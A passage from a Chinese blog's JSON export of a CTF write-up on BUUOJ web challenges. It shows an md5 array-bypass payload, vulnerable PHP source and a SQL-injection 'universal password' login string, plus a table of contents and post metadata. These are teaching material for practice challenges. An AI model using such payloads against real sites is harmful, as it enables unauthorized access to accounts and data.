operator\">--</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这个很容易，payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;7dfb0fbd-6519-4c8b-a2ef-62d6f72c9f5c.node3.buuoj.cn&#x2F;levels91.php?a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>进入下一关，给出来源码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201016190237.png\" alt=\"flag\"></p>\n","text":"[极客大挑战 2019]LoveSQL考点：SQL注入 试了一下，在password处构造万能密码登陆 &#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20or%201&#x3D;1%23 得到了一个密码是...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL\"><span class=\"toc-text\">[极客大挑战 2019]LoveSQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RoarCTF-2019-Easy-Calc\"><span class=\"toc-text\">[RoarCTF 2019]Easy Calc</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife\"><span class=\"toc-text\">[极客大挑战 2019]Knife</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http\"><span class=\"toc-text\">[极客大挑战 2019]Http</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HCTF-2018-admin\"><span class=\"toc-text\">[HCTF 2018]admin</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL\"><span class=\"toc-text\">[极客大挑战 2019]BabySQL</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload\"><span class=\"toc-text\">[极客大挑战 2019]Upload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile\"><span class=\"toc-text\">[ACTF2020 新生赛]BackupFile</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload\"><span class=\"toc-text\">[ACTF2020 新生赛]Upload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SUCTF-2019-CheckIn\"><span class=\"toc-text\">[SUCTF 2019]CheckIn</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag\"><span class=\"toc-text\">[极客大挑战 2019]BuyFlag</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF2020-Easy-MD5\"><span class=\"toc-text\">[BJDCTF2020]Easy MD5</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"redis未授权访问漏洞复现","uid":"d276b23f1cbe41c451a3655655515353","slug":"redis未授权访问漏洞复现","date":"2020-10-15T08:30:39.000Z","updated":"2020-10-18T06:08:20.000Z","comments":true,"path":"api/articles/redis未授权访问漏洞复现.json","keywords":"A1andNS","cover":[],"text":"之前也遇到存在未授权问题的redis服务。这里熟悉一下redis未授权。 Redis环境搭建 redis version: 3.2.9 Download Link：http://download.redis.io/releases/redis-3.2.9.tar.gz Opera...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":31,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":5,"path":"api/tags/漏洞复现.json"},{"name":"redis","slug":"redis","count":1,"path":"api/tags/redis.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"西湖论剑2020复现","uid":"0c2fa944cd89422ab54a5eca03b47d0e","slug":"西湖论剑2020复现","date":"2020-10-12T08:15:37.000Z","updated":"2020-10-13T04:03:18.000Z","comments":true,"path":"api/articles/西湖论剑2020复现.json","keywords":"A1andNS","cover":[],"text":"今天NU1L和ChaMD5出了Web的WP，赶紧趁热复现一手。 hardxss这题只有两个功能点，一个是子域名爆破，一个是联系站长。试了一下子域名爆破就是个幌子，关键应该在于联系站长的功能。 嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"西湖论剑","slug":"西湖论剑","count":2,"path":"api/tags/西湖论剑.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}